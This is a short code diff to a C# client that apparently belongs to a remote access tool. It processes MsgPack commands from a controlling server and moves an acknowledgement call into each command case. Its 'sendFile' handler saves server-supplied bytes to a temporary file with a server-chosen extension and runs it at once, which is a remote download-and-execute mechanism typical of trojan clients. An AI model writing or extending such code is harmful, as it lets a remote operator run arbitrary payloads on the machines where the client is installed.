@@ -173,13 +173,13 @@ namespace Client
         {
             try
             {
-                Received();
                 MsgPack unpack_msgpack = new MsgPack();
                 unpack_msgpack.DecodeFromBytes((byte[])Data);
                 switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                 {
                     case "sendMessage":
                         {
+                            Received();
                             MessageBox.Show(unpack_msgpack.ForcePathObject("Message").AsString);
                         }
                         break;
@@ -192,6 +192,7 @@ namespace Client
 
                     case "sendFile":
                         {
+                            Received();
                             string FullPath = Path.GetTempFileName() + unpack_msgpack.ForcePathObject("Extension").AsString;
                             unpack_msgpack.ForcePathObject("File").SaveBytesToFile(FullPath);
                             Process.Start(FullPath);
